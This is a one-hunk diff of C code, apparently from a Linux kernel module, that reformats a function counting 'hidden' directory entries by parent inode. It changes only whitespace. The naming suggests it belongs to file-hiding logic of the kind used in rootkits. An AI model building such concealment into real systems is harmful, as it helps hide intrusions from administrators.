@@ -188,7 +188,7 @@ int fs_is_dir_inode_hidden(u64 ino)
 {
 	struct hidden_names *node, *node_safe;
 	int count = 0;
-	list_for_each_entry_safe(node, node_safe, &names_node, list) {
+	list_for_each_entry_safe (node, node_safe, &names_node, list) {
 		if (ino == node->ino_parent && node->is_dir)
 			count++;
 	}
